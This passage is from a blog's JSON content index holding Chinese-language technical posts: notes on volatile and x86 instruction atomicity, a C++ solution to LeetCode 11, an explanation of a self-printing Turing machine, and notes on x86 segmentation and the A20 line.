class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">// use Object c</span></span><br></pre></td></tr></table></figure>\n<p> 因为内存重排序，所以可能使用 Object c时还没有被初始化<br> Intel 的Software Developer’s Manual，有<code>Memory Ordering</code>的介绍<br> C++、Java等还有自己的memory model</p>\n</li>\n<li>在非本地跳转中，volatile用的比较多。因为非本地跳转会加载存储在env中的环境（包括寄存器的值）</li>\n</ul>\n<h2 id=\"单条汇编的原子性\"><a href=\"#单条汇编的原子性\" class=\"headerlink\" title=\"单条汇编的原子性\"></a>单条汇编的原子性</h2><ul>\n<li>CSAPP的内嵌汇编的web aside中<blockquote>\n<p>To specify that an instruction should be) executed atomically, a special lock prefix byte (with code 0xF0) is included in the machine code immediately before the instruction. This is written in assembly by writing lock as if it were an instruction on a separate line before the instruction that is to be executed atomically.</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"Intel对于连接在同一个system-bus上的多处理器的管理机制\"><a href=\"#Intel对于连接在同一个system-bus上的多处理器的管理机制\" class=\"headerlink\" title=\"Intel对于连接在同一个system bus上的多处理器的管理机制\"></a>Intel对于<strong>连接在同一个system bus上</strong>的多处理器的管理机制</h2><blockquote>\n<ul>\n<li>注意，以下都是基于<em>Intel® 64 and IA-32 Architectures Software Developer’s Manual</em> (2018 5 18), Vol.3A ch8</li>\n<li>The Intel 64 and IA-32 architectures provide mechanisms for managing and improving the performance of multiple processors connected to the same system bus. </li>\n</ul>\n</blockquote>\n<h3 id=\"这些机制的特性\"><a href=\"#这些机制的特性\" class=\"headerlink\" title=\"这些机制的特性\"></a>这些机制的特性</h3><ul>\n<li>保证内存一致性<blockquote>\n<p>To maintain system memory coherency. When two or more processors are attempting simultaneously to access the same address in system memory, some communication mechanism or memory access protocol must be available to promote data coherency and, in some instances, to allow one processor to temporarily lock a memory location.</p>\n</blockquote>\n</li>\n<li>保证cache的一致性。比如一个shared变量被缓存在不同processor的L1 cache，那么其中一个processor修改了这个变量，其他processor要如何感知。具体可以看<a href=\"https://en.wikipedia.org/wiki/MESI_protocol\" target=\"_blank\" rel=\"noopener\">MESI Protocol</a><blockquote>\n<p>To maintain cache consistency — When one processor accesses data cached on another processor, it must not receive incorrect data. If it modifies data, all other processors that access that data must receive the modified data.</p>\n</blockquote>\n</li>\n<li>可预测的内存写顺序<blockquote>\n<p>To allow predictable ordering of writes to memory. In some circumstances, it is important that memory writes be observed externally in precisely the same order as programmed. </p>\n</blockquote>\n</li>\n<li>分派中断处理<blockquote>\n<p> To distribute interrupt handling among a group of processors — When several processors are operating in a system in parallel, it is useful to have a centralized mechanism for receiving interrupts and distributing them to available processors for servicing.</p>\n</blockquote>\n</li>\n<li><blockquote>\n<p>To increase system performance by exploiting the multi-threaded and multi-process nature of contemporary operating systems and applications.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"Guaranteed-Atomic-Operations\"><a href=\"#Guaranteed-Atomic-Operations\" class=\"headerlink\" title=\"Guaranteed Atomic Operations\"></a>Guaranteed Atomic Operations</h3><ul>\n<li><code>atomically</code>的含义<blockquote>\n<p>That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location.</p>\n</blockquote>\n</li>\n<li>Intel还支持通过bus locking来实现对shared area of memory的操作，不过这个不是默认行为。</li>\n<li>如果是对于cache中的内存操作，不适用bus lock，而是用processor’s cache coherency protocols来保证原子操作时，其他对于这内存位置的cache被正确管理</li>\n<li>The Intel486 processor (and newer processors since) guarantees that the following basic <strong>memory operations</strong> will always be carried out atomically:<ul>\n<li>Reading or writing a byte</li>\n<li>Reading or writing a word aligned on a 16-bit boundary</li>\n<li>Reading or writing a doubleword aligned on a 32-bit boundary</li>\n</ul>\n</li>\n<li>The Pentium processor (and newer processors since) guarantees that the following additional <strong>memory operations</strong> will always be carried out atomically:<ul>\n<li>Reading or writing a quadword aligned on a 64-bit boundary</li>\n<li>16-bit accesses to uncached memory locations that fit within a 32-bit data bus</li>\n</ul>\n</li>\n<li>The P6 family processors (and newer processors since) guarantee that the following additional memory operation will always be carried out atomically:<ul>\n<li>Unaligned 16-, 32-, and 64-bit accesses to cached memory that fit within a cache line</li>\n</ul>\n</li>\n<li>以上三个保证我也不太清楚<strong>memory operations</strong>是不是不包括对cache的operations，比如说，某变量缓存在某处理器的L1 cache中，然后对其进行读写，每个读写操作是否对于其他processor来说也是原子的</li>\n<li>Accesses to cacheable memory that are split across cache lines and page boundaries are not guaranteed to be atomic by the Intel Core 2 Duo, Intel® Atom™, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, P6 family, Pentium, and Intel486 processors.</li>\n<li>The Intel Core 2 Duo, Intel Atom, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, and P6 family processors provide bus control signals that permit external memory subsystems to make split accesses atomic; (however, nonaligned data accesses will seriously impact the performance of the processor and should be avoided.)</li>\n<li>An x87 instruction or an SSE instructions that accesses data larger than a quadword may be implemented using multiple memory accesses. If such an instruction stores to memory, some of the accesses may complete (writing to memory) while another causes the operation to fault for architectural reasons (e.g. due an page-table entry that is marked “not present”). In this case, the effects of the completed accesses may be visible to software even though the overall instruction caused a fault. If TLB invalidation has been delayed (see Section 4.10.4.4), such page faults may occur even if all accesses are to the same page.</li>\n</ul>\n<h3 id=\"…-原文还有多个section，讲述bus-的lock等内容\"><a href=\"#…-原文还有多个section，讲述bus-的lock等内容\" class=\"headerlink\" title=\"….(原文还有多个section，讲述bus 的lock等内容)\"></a>….(原文还有多个section，讲述bus 的lock等内容)</h3>","slug":"关于volatile、单条指令的原子性","categories":[{"name":"OS","slug":"OS","permalink":"https://h-zex.github.io/categories/OS/"},{"name":"Computer architecture","slug":"OS/Computer-architecture","permalink":"https://h-zex.github.io/categories/OS/Computer-architecture/"}],"tags":[{"name":"Intel","slug":"Intel","permalink":"https://h-zex.github.io/tags/Intel/"},{"name":"volatile","slug":"volatile","permalink":"https://h-zex.github.io/tags/volatile/"},{"name":"原子性","slug":"原子性","permalink":"https://h-zex.github.io/tags/原子性/"}]},{"title":"LeetCode 11.Container With Most Water","date":"2018-08-04T04:48:35.594Z","path":"2018/08/04/LeetCode-11-Container-With-Most-Water/","text":"$O(NlgN)$解法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* * 思路： * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置 * 方法是递推 * 首先，map是红黑树实现的，所以其是有序的 * 然后，每次求出第i根柱子后，把 &lt;height[i], &lt;i, result&gt;&gt; push到map里 * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。 * 既然q大于等于p并且在左边，那么p的result应该是q */class Solution &#123; private: typedef pair&lt;int, int&gt; PII; multimap&lt;int, PII, greater&lt;int&gt;&gt; tree; multimap&lt;int, PII, greater&lt;int&gt;&gt; rtree; void ct(const vector&lt;int&gt; &amp;height) &#123; int i = 1; for (auto it = height.begin(); it != height.end(); ++it, ++i) &#123; auto p = tree.insert(pair&lt;int, PII&gt;(*it, PII(i, i))); if (p != tree.begin()) &#123; auto k = (--p)-&gt;second; (++p)-&gt;second = PII(i, k.second); &#125; &#125; &#125; void crt(const vector&lt;int&gt; &amp;height) &#123; int i = height.size(); for (auto it = height.rbegin(); it != height.rend(); ++it, --i) &#123; auto p = rtree.insert(pair&lt;int, PII&gt;(*it, PII(i, i))); if (p != rtree.begin()) &#123; auto k = (--p)-&gt;second; (++p)-&gt;second = PII(i, k.second); &#125; &#125; &#125; public: int maxArea(vector&lt;int&gt; &amp;height) &#123; ct(height); crt(height); int ans = -1; for (auto it = tree.begin(); it != tree.end(); ++it) &#123; int p = (it-&gt;first) * (it-&gt;second.first - it-&gt;second.second); ans = ans &lt; p ? p : ans; &#125; for (auto it = rtree.begin(); it != rtree.end(); ++it) &#123; int p = (it-&gt;first) * (it-&gt;second.second - it-&gt;second.first); ans = ans &lt; p ? p : ans; &#125; return ans; return 0; &#125;&#125;;","raw":"---\ntitle: LeetCode 11.Container With Most Water\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-07-20-21:40:30\ntags:\n- Leetcode\n- ACM\ndescription: solution\ncategories:\n- 算法\n---\n\n## $O(NlgN)$解法\n\n```cpp\n/*\n * 思路：\n * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置\n * 方法是递推\n * 首先，map是红黑树实现的，所以其是有序的\n * 然后，每次求出第i根柱子后，把 <height[i], <i, result>> push到map里\n * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height\n * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result\n * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。\n * 既然q大于等于p并且在左边，那么p的result应该是q\n */\nclass Solution {\n  private:\n    typedef pair<int, int> PII;\n    multimap<int, PII, greater<int>> tree;\n    multimap<int, PII, greater<int>> rtree;\n    void ct(const vector<int> &height) {\n        int i = 1;\n        for (auto it = height.begin(); it != height.end(); ++it, ++i) {\n            auto p = tree.insert(pair<int, PII>(*it, PII(i, i)));\n            if (p != tree.begin()) {\n                auto k = (--p)->second;\n                (++p)->second = PII(i, k.second);\n            }\n        }\n    }\n    void crt(const vector<int> &height) {\n        int i = height.size();\n        for (auto it = height.rbegin(); it != height.rend(); ++it, --i) {\n            auto p = rtree.insert(pair<int, PII>(*it, PII(i, i)));\n            if (p != rtree.begin()) {\n                auto k = (--p)->second;\n                (++p)->second = PII(i, k.second);\n            }\n        }\n    }\n\n  public:\n    int maxArea(vector<int> &height) {\n        ct(height);\n        crt(height);\n        int ans = -1;\n        for (auto it = tree.begin(); it != tree.end(); ++it) {\n            int p = (it->first) * (it->second.first - it->second.second);\n            ans = ans < p ? p : ans;\n        }\n        for (auto it = rtree.begin(); it != rtree.end(); ++it) {\n            int p = (it->first) * (it->second.second - it->second.first);\n            ans = ans < p ? p : ans;\n        }\n        return ans;\n        return 0;\n    }\n};\n```\n","content":"<h2 id=\"O-NlgN-解法\"><a href=\"#O-NlgN-解法\" class=\"headerlink\" title=\"$O(NlgN)$解法\"></a>$O(NlgN)$解法</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * 思路：</span></span><br><span class=\"line\"><span class=\"comment\"> * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置</span></span><br><span class=\"line\"><span class=\"comment\"> * 方法是递推</span></span><br><span class=\"line\"><span class=\"comment\"> * 首先，map是红黑树实现的，所以其是有序的</span></span><br><span class=\"line\"><span class=\"comment\"> * 然后，每次求出第i根柱子后，把 &lt;height[i], &lt;i, result&gt;&gt; push到map里</span></span><br><span class=\"line\"><span class=\"comment\"> * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height</span></span><br><span class=\"line\"><span class=\"comment\"> * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result</span></span><br><span class=\"line\"><span class=\"comment\"> * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。</span></span><br><span class=\"line\"><span class=\"comment\"> * 既然q大于等于p并且在左边，那么p的result应该是q</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Solution</span> &#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">typedef</span> pair&lt;<span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>&gt; PII;</span><br><span class=\"line\">    <span class=\"built_in\">multimap</span>&lt;<span class=\"keyword\">int</span>, PII, greater&lt;<span class=\"keyword\">int</span>&gt;&gt; tree;</span><br><span class=\"line\">    <span class=\"built_in\">multimap</span>&lt;<span class=\"keyword\">int</span>, PII, greater&lt;<span class=\"keyword\">int</span>&gt;&gt; rtree;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ct</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = height.begin(); it != height.end(); ++it, ++i) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">auto</span> p = tree.insert(pair&lt;<span class=\"keyword\">int</span>, PII&gt;(*it, PII(i, i)));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p != tree.begin()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">auto</span> k = (--p)-&gt;second;</span><br><span class=\"line\">                (++p)-&gt;second = PII(i, k.second);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">crt</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = height.size();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = height.rbegin(); it != height.rend(); ++it, --i) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">auto</span> p = rtree.insert(pair&lt;<span class=\"keyword\">int</span>, PII&gt;(*it, PII(i, i)));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p != rtree.begin()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">auto</span> k = (--p)-&gt;second;</span><br><span class=\"line\">                (++p)-&gt;second = PII(i, k.second);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">maxArea</span><span class=\"params\">(<span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class=\"line\">        ct(height);</span><br><span class=\"line\">        crt(height);</span><br><span class=\"line\">        <span class=\"keyword\">int</span> ans = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = tree.begin(); it != tree.end(); ++it) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> p = (it-&gt;first) * (it-&gt;second.first - it-&gt;second.second);</span><br><span class=\"line\">            ans = ans &lt; p ? p : ans;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = rtree.begin(); it != rtree.end(); ++it) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> p = (it-&gt;first) * (it-&gt;second.second - it-&gt;second.first);</span><br><span class=\"line\">            ans = ans &lt; p ? p : ans;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n","slug":"LeetCode-11-Container-With-Most-Water","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"https://h-zex.github.io/tags/Leetcode/"},{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"}]},{"title":"打印自身的图灵机的构造","date":"2018-08-03T03:16:51.000Z","path":"2018/08/03/打印自身的图灵机的构造/","text":"以下是Introduction to The Theory of Computation 英文第三版的Lemma6.1、Theory6.3的个人理解 下文中，&lt;p&gt; 代表图灵机p的编码 首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台 然后，利用上面这个东西，就可以特殊构造某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身 然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是&lt;p&gt;&lt;q&gt; ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机 继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出&lt;q&gt;&lt;b&gt; 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了&lt;p&gt;&lt;q&gt;&lt;b&gt; 。当图灵机a、图灵机q运行完之后，纸带上就有了&lt;p&gt;&lt;q&gt;&lt;b&gt; 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出&lt;p&gt; 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得&lt;p&gt;&lt;q&gt;&lt;b&gt; ，继续执行计算。 上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。 更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出&lt;p&gt; ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与&lt;p&gt;&lt;q&gt; 无关）。 那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下w&lt;p&gt;&lt;q&gt;&lt;b&gt; 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。","raw":"---\ntitle: 打印自身的图灵机的构造\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-08-03 11:16:51\ntags:\n- 图灵机\ndescription: 打印自身的图灵机的构造\ncategories:\n- 计算理论\n---\n\n- 以下是*Introduction to The Theory of Computation* 英文第三版的Lemma6.1、Theory6.3的个人理解 \n\n- 下文中，`<p>` 代表图灵机p的编码\n\n\n- 首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台\n- 然后，利用上面这个东西，就可以**特殊构造**某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身\n- 然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是`<p><q>` ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机\n- 继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出`<q><b>` 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了`<p><q><b>` 。当图灵机a、图灵机q运行完之后，纸带上就有了`<p><q><b>` 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出`<p>` 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得`<p><q><b>` ，继续执行计算。\n- 上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。\n- 更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出`<p>` ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与`<p><q>` 无关）。\n- 那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下`w<p><q><b>` 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。\n","content":"<ul>\n<li><p>以下是<em>Introduction to The Theory of Computation</em> 英文第三版的Lemma6.1、Theory6.3的个人理解 </p>\n</li>\n<li><p>下文中，<code>&lt;p&gt;</code> 代表图灵机p的编码</p>\n</li>\n</ul>\n<ul>\n<li>首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台</li>\n<li>然后，利用上面这个东西，就可以<strong>特殊构造</strong>某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身</li>\n<li>然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是<code>&lt;p&gt;&lt;q&gt;</code> ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机</li>\n<li>继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出<code>&lt;q&gt;&lt;b&gt;</code> 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。当图灵机a、图灵机q运行完之后，纸带上就有了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出<code>&lt;p&gt;</code> 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> ，继续执行计算。</li>\n<li>上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。</li>\n<li>更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出<code>&lt;p&gt;</code> ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与<code>&lt;p&gt;&lt;q&gt;</code> 无关）。</li>\n<li>那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下<code>w&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。</li>\n</ul>\n","slug":"打印自身的图灵机的构造","categories":[{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/categories/计算理论/"}],"tags":[{"name":"图灵机","slug":"图灵机","permalink":"https://h-zex.github.io/tags/图灵机/"}]},{"title":"Segmentation 分段","date":"2018-06-30T05:09:58.000Z","path":"2018/06/30/Segmentation-分段/","text":"以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理 xv6book, PC Assembly Language, CMU-15-410 segment 在分段中，寻址使用的是一个 &lt;selector, offset&gt; 的pair real mode selector 保存在segment register，这是一个paragraph number。 内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address 16-bit protected mode selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。 table selector flag指示的是segment number使用的是GDT还是LDT的index RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级 In this case (the %CS register), the RPL sets the privilege level of the processor 不过，在mit 6.828的那本xv6book的Appendix B中有一幅图 其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点 GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset&gt;= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address 32-bit protected mode 80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。 解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是&lt;selector, offset&gt; ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表 题外话 可以使用一些方法使得分段实际上跟没有起作用一样。 比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的 在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用 The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal. 逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。A20 Line wiki If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel’s 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren’t quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).","raw":"---\ntitle: Segmentation 分段\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-06-30 13:09:58\ntags:\n- MIT 6.828\n- OS\ndescription: MIT 6.828, CMU 15-410 关于segmentation的资料的整理\ncategories:\n- OS\n---\n\n> 以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理\n>\n> [xv6book](https://pdos.csail.mit.edu/6.828/2017/xv6/book-rev10.pdf), [PC Assembly Language](https://pdos.csail.mit.edu/6.828/2017/readings/pcasm-book.pdf), [CMU-15-410 segment ](https://www.cs.cmu.edu/~410/doc/segments/segments.html)\n\n> 在分段中，寻址使用的是一个 `<selector, offset>` 的pair\n\n#### real mode\n\n- selector 保存在segment register，这是一个paragraph number。\n\n- > 内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph\n\n- segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address\n\n#### 16-bit protected mode\n\n- selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 \n  {% asset_img 1.gif %}\n\n  segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。\n\n  table selector flag指示的是segment number使用的是GDT还是LDT的index\n\n  RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级\n\n  >  In this case (the %CS register), the RPL sets the privilege level of the processor\n\n  不过，在mit 6.828的那本xv6book的Appendix B中有一幅图\n\n  {% asset_img 2.png %}\n\n  其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点\n\n- GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset>= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address\n\n#### 32-bit protected mode\n\n- 80386 引入了32-bit protected 